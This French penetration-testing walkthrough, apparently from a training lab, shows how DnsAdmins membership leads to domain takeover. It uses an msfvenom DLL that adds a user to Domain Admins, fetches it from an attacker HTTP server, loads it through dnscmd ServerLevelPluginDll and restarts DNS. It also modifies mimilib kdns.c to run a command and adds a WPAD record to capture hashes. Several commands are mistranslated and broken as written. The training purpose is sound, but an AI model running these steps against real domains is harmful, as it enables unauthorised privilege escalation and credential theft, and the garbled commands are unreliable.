Administrateurs DNS
=========

* * * * *

Les membres du groupe [DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#dnsadmins) ont accès aux informations DNS sur le réseau. Le service DNS Windows prend en charge les plugins personnalisés et peut appeler des fonctions à partir de ceux-ci pour résoudre les requêtes de noms qui ne sont pas dans le champ d'application des zones DNS hébergées localement. Le service DNS s'exécute en tant que `NT AUTHORITY\SYSTEM`, de sorte que l'appartenance à ce groupe pourrait potentiellement être exploitée pour élever les privilèges sur un contrôleur de domaine ou dans une situation où un serveur distinct agit en tant que serveur DNS pour le domaine. Il est possible d'utiliser l'utilitaire intégré [dnscmd](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) pour spécifier le chemin de la DLL du plug-in. Comme détaillé dans cet excellent [article](https://adsecurity.org/?p=4064), l'attaque suivante peut être effectuée lorsque le DNS est exécuté sur un contrôleur de domaine (ce qui est très courant) :

-   La gestion DNS est effectuée via RPC

-   [ServerLevelPluginDll](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) nous permet de charger une DLL personnalisée sans aucune vérification des DLL chemin. Cela peut être fait avec l'outil `dnscmd` à partir de la ligne de commande

-   Lorsqu'un membre du groupe `DnsAdmins` exécute la commande `dnscmd` ci-dessous, la clé de registre `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` est renseignée

-   Lorsque le service DNS est redémarré, la DLL de ce chemin sera chargée (c'est-à-dire un partage réseau auquel le compte d'ordinateur du contrôleur de domaine peut accéder)

-   Un attaquant peut charger une DLL personnalisée pour obtenir un reverse shell ou même charger un outil tel que Mimikatz en tant que DLL pour vider les informations d'identification.

Passons à l'attaque.

* * * * *

Tirer parti de l'accès DNSAdmins

---------------------------

#### Génération de DLL malveillantes

Nous pouvons générer une DLL malveillante pour ajouter un utilisateur au groupe `domain admins` en utilisant `msfvenom`.

Génération de DLL malveillantes

```

dsgsec@htb[/htb]$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

[-] Aucune plate-forme n'a été sélectionnée, en choisissant Msf::Module::Platform::Windows à partir de la charge utile

[-] Aucune arche sélectionnée, sélection de l'arche : x64 à partir de la charge utile

Aucun encodeur spécifié, sortie de données utiles brutes

Taille de la charge utile : 313 octets

Taille finale du fichier dll : 5120 octets

Enregistré sous : adduser.dll

```

#### Démarrage du serveur HTTP local

Ensuite, démarrez un serveur HTTP Python.

Démarrage du serveur HTTP local

```

dsgsec@htb[/htb]$ python3 -m http.serveur 7777

Serveur HTTP sur le port 0.0.0.0 7777 (http://0.0.0.0:7777/) ...

10.129.43.9 - - [19/mai/2021 19:22:46] "GET /adduser.dll HTTP/1.1" 200 -

```

#### Téléchargement du fichier vers la cible

Téléchargez le fichier sur la cible.

Téléchargement du fichier vers la cible

```

PS C:\htb> wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"

```

Voyons d'abord ce qui se passe si nous utilisons l'utilitaire `dnscmd` pour charger une DLL personnalisée avec un utilisateur non privilégié.

#### Chargement de la DLL en tant qu'utilisateur non privilégié

Chargement de la DLL en tant qu'utilisateur non privilégié

```

C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

Le serveur DNS n'a pas pu réinitialiser la propriété du registre.

Statut = 5 (0x00000005)

Échec de la commande : ERROR_ACCESS_DENIED

```

Comme prévu, la tentative d'exécution de cette commande en tant qu'utilisateur normal échoue. Seuls les membres du groupe "DnsAdmins" sont autorisés à le faire.

#### Chargement de la DLL en tant que membre de DnsAdmins

Chargement de la DLL en tant que membre de DnsAdmins

```

C:\htb> Get-ADGroupMember -Identity DnsAdmins

nom_distingué : CN=netadm,CN=Utilisateurs,DC=INLANEFREIGHT,DC=LOCAL

nom              : netadm

objectClass      : utilisateur

GUIDobjet        : 1a1ac159-f364-4805-a4bb-7153051a8c14

SamAccountName    : netadm

SID               : S-1-5-21-669053619-2741956077-1013132368-1109

```

#### Chargement de la DLL personnalisée

Après avoir confirmé l'appartenance au groupe "DnsAdmins", nous pouvons réexécuter la commande pour charger une DLL personnalisée.

Chargement d'une DLL personnalisée

```

C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

La propriété de registre serverlevelplugindll a été réinitialisée avec succès.

Commande terminée avec succès.

```

Remarque : Nous devons spécifier le chemin complet vers notre DLL personnalisée ou l'attaque ne fonctionnera pas correctement.

Seul l'utilitaire `dnscmd` peut être utilisé par les membres du groupe `DnsAdmins`, car ils n'ont pas directement l'autorisation sur la clé de registre.

Avec le paramètre de registre contenant le chemin de notre plugin malveillant configuré et notre charge utile créée, la DLL sera chargée au prochain démarrage du service DNS. L'appartenance au groupe DnsAdmins ne donne pas la possibilité de redémarrer le service DNS, mais il est concevable que les administrateurs système autorisent les administrateurs DNS à le faire.

Après avoir redémarré le service DNS (si notre utilisateur a ce niveau d'accès), nous devrions pouvoir exécuter notre DLL personnalisée et ajouter un utilisateur (dans notre cas) ou obtenir un reverse shell. Si nous n'avons pas accès à resdémarrer le serveur DNS, nous devrons attendre que le serveur ou le service redémarre. Vérifions les autorisations de notre utilisateur actuel sur le service DNS.

#### Recherche du SID de l'utilisateur

Tout d'abord, nous avons besoin du SID de notre utilisateur.

Trouver le SID de l'utilisateur

```

C:\htb> compte utilisateur wmic où name="netadm" obtient sid

SID

S-1-5-21-669053619-2741956077-1013132368-1109

```

#### Vérification des autorisations sur le service DNS

Une fois que nous avons le SID de l'utilisateur, nous pouvons utiliser la commande `sc` pour vérifier les autorisations sur le service. D'après cet [article](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/), nous pouvons voir que notre utilisateur dispose des autorisations "RPWP" qui se traduisent par "SERVICE_START" et "SERVICE_STOP". `, respectivement.

Vérification des autorisations sur le service DNS

```

C:\htb> sc.exe sdshow DNS

D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;; SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)

```

Consultez le module "Windows Fundamentals" pour une explication de la syntaxe SDDL dans Windows.

#### Arrêt du service DNS

Après avoir confirmé ces autorisations, nous pouvons émettre les commandes suivantes pour arrêter et démarrer le service.

Arrêt du service DNS

```

C:\htb> sc stop dns

SERVICE_NAME : DNS

TYPE              : 10  WIN32_OWN_PROCESS

ÉTAT              : 3  STOP_PENDING

(ARRÊT, PAUSABLE, ACCEPTE_ARRÊT)

WIN32_EXIT_CODE    : 0  (0x0)

SERVICE_EXIT_CODE : 0  (0x0)

POINT DE CONTRÔLE         : 0x1

WAIT_HINT          : 0x7530

```

Le service DNS tentera de démarrer et d'exécuter notre DLL personnalisée, mais si nous vérifions l'état, il indiquera qu'il n'a pas pu démarrer correctement (nous en reparlerons plus tard).

#### Démarrage du service DNS

Démarrage du service DNS

```

C:\htb> sc start dns

SERVICE_NAME : DNS

TYPE              : 10  WIN32_OWN_PROCESS

ÉTAT              : 2  START_PENDING

(NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)

WIN32_EXIT_CODE    : 0  (0x0)

SERVICE_EXIT_CODE : 0  (0x0)

POINT DE CONTRÔLE         : 0x0

WAIT_HINT          : 0x7d0

PID                : 6960

DRAPEAUX              :

```

#### Confirmation de l'appartenance au groupe

Si tout se passe comme prévu, notre compte sera ajouté au groupe Admins du domaine ou recevra un shell inversé si notre DLL personnalisée a été créée pour nous redonner une connexion.

Confirmation de l'appartenance au groupe

```

C:\htb> groupe net "Domain Admins" /dom

Nom du groupe     Domain Admins

Commentaire        Administrateurs désignés du domaine

Membres

-------------------------------------------------- -----------------------------

Administrateur            netadm

La commande s'est terminée avec succès.

```

* * * * *

Nettoyer

-----------

Apporter des modifications à la configuration et arrêter/redémarrer le service DNS sur un contrôleur de domaine sont des actions très destructrices et doivent être exercées avec beaucoup de soin. En tant que testeur d'intrusion, nous devons exécuter ce type d'action par notre client avant de procéder, car cela pourrait potentiellement arrêter le DNS pour tout un environnement Active Directory et causer de nombreux problèmes. Si notre client donne son autorisation pour poursuivre cette attaque, nous devons être en mesure soit de couvrir nos traces et de nettoyer après nous-mêmes, soit de proposer à notre client des étapes sur la façon d'annuler les modifications.

Ces étapes doivent être effectuées à partir d'une console élevée avec un compte d'administrateur local ou de domaine.

#### Confirmation de la clé de registre ajoutée

La première étape consiste à confirmer que la clé de registre `ServerLevelPluginDll` existe. Tant que notre DLL personnalisée n'aura pas été supprimée, nous ne pourrons pas redémarrer correctement le service DNS.

Confirmation de la clé de registre ajoutée

```

C:\htb> reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters

GlobalQueryBlockList    REG_MULTI_SZ    wpad\0isatap

ActiverGlobalQueryBlockList    REG_DWORD    0x1

PrécédentNom d'hôte local    REG_SZ    WINLPE-DC01.INLANEFREIGHT.LOCAL

Transporteurs    REG_MULTI_SZ    1.1.1.1\08.8.8.8

Délai de transfert    REG_DWORD    0x3

Estesclave    REG_DWORD    0x0

BootMethod    REG_DWORD    0x3

AdminConfigured    REG_DWORD    0x1

ServerLevelPluginDll    REG_SZ    adduser.dll

```

#### Suppression de la clé de registre

Nous pouvons utiliser la commande `reg delete` pour supprimer la clé qui pointe vers notre DLL personnalisée.

Suppression de la clé de registre

```

C:\htb> reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll

Supprimer la valeur de registre ServerLevelPluginDll (Oui/Non) ? Oui

L'opération s'est bien déroulée.

```

#### Redémarrer le service DNS

Une fois cela fait, nous pouvons redémarrer le service DNS.

Redémarrer le service DNS

```

C:\htb> sc.exe démarre le DNS

SERVICE_NAME : DNS

TYPE              : 10  WIN32_OWN_PROCESS

ÉTAT              : 2  START_PENDING(NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)

WIN32_EXIT_CODE    : 0  (0x0)

SERVICE_EXIT_CODE : 0  (0x0)

POINT DE CONTRÔLE         : 0x0

WAIT_HINT          : 0x7d0

PID                : 4984

DRAPEAUX              :

```

#### Vérification de l'état du service DNS

Si tout s'est déroulé comme prévu, l'interrogation du service DNS montrera qu'il est en cours d'exécution. Nous pouvons également confirmer que le DNS fonctionne correctement dans l'environnement en effectuant un "nslookup" sur l'hôte local ou un autre hôte du domaine.

Vérification de l'état du service DNS

```

C:\htb> sc requête dns

SERVICE_NAME : DNS

TYPE              : 10  WIN32_OWN_PROCESS

ÉTAT              : 4  EN COURS

(ARRÊT, PAUSABLE, ACCEPTE_ARRÊT)

WIN32_EXIT_CODE    : 0  (0x0)

SERVICE_EXIT_CODE : 0  (0x0)

POINT DE CONTRÔLE         : 0x0

WAIT_HINT          : 0x0

```

Encore une fois, il s'agit d'une attaque potentiellement destructrice que nous ne devons mener qu'avec l'autorisation explicite de et en coordination avec notre client. S'ils comprennent les risques et veulent voir une preuve de concept complète, les étapes décrites dans cette section aideront à démontrer l'attaque et à nettoyer par la suite.

* * * * *

Utilisation de Mimilib.dll

-----------------

Comme détaillé dans ce [post](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html), nous pourrions également utiliser [mimilib.dll] (https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) du créateur de l'outil `Mimikatz` pour obtenir l'exécution de commandes en modifiant le [kdns.c](https://github.com/gentilkiwi /mimikatz/blob/master/mimilib/kdns.c) pour exécuter un reverse shell one-liner ou une autre commande de notre choix.

Code : c

```

/* Benjamin DELPY `gentilkiwi`

https://blog.gentilkiwi.com

benjamin@gentilkiwi.com

Licence : https://creativecommons.org/licenses/by/4.0/

*/

#include "kdns.h"

DWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)

{

retourner ERROR_SUCCESS ;

}

DWORD WINAPI kdns_DnsPluginCleanup()

{

retourner ERROR_SUCCESS ;

}

DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)

{

FICHIER * kdns_logfile;

#pragma avertissement (pousser)

#pragma avertissement (désactiver : 4996)

if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))

#pragma avertissement (pop)

{

klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);

fclose(kdns_logfile);

system("ENTREZ LA COMMANDE ICI");

}

retourner ERROR_SUCCESS ;

}

```

* * * * *

Création d'un enregistrement WPAD

----------------------

Une autre façon d'abuser des privilèges du groupe DnsAdmins consiste à créer un enregistrement WPAD. L'adhésion à ce groupe nous donne le droit de [désactiver la sécurité globale du bloc de requête](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps), qui par default bloque cette attaque. Server 2008 a introduit pour la première fois la possibilité d'ajouter à une liste de blocage de requête globale sur un serveur DNS. Par défaut, le protocole WPAD (Web Proxy Automatic Discovery Protocol) et le protocole ISATAP (Intra-site Automatic Tunnel Addressing Protocol) figurent dans la liste de blocage des requêtes globales. Ces protocoles sont assez vulnérables au piratage et tout utilisateur de domaine peut créer un objet informatique ou un enregistrement DNS contenant ces noms.

Après avoir désactivé la liste de blocage de requête globale et créé un enregistrement WPAD, chaque machine exécutant WPAD avec les paramètres par défaut verra son trafic proxy via notre machine d'attaque. Nous pourrions utiliser un outil tel que [Responder](https://github.com/lgandx/Responder) ou [Inveigh](https://github.com/Kevin-Robertson/Inveigh) pour effectuer une usurpation de trafic et tenter de capturez les hachages de mot de passe et déchiffrez-les hors ligne ou effectuez une attaque SMBRelay.

#### Désactivation de la liste de blocage des requêtes globales

Pour mettre en place cette attaque, nous avons d'abord désactivé la liste de blocage des requêtes globales :

Désactivation de la liste de blocage de requête globale

```

C:\htb> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local

```

#### Ajout d'un enregistrement WPAD

Ensuite, nous ajoutons un enregistrement WPAD pointant vers notre machine d'attaque.

Ajout d'un enregistrement WPAD

```

C:\htb> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3

```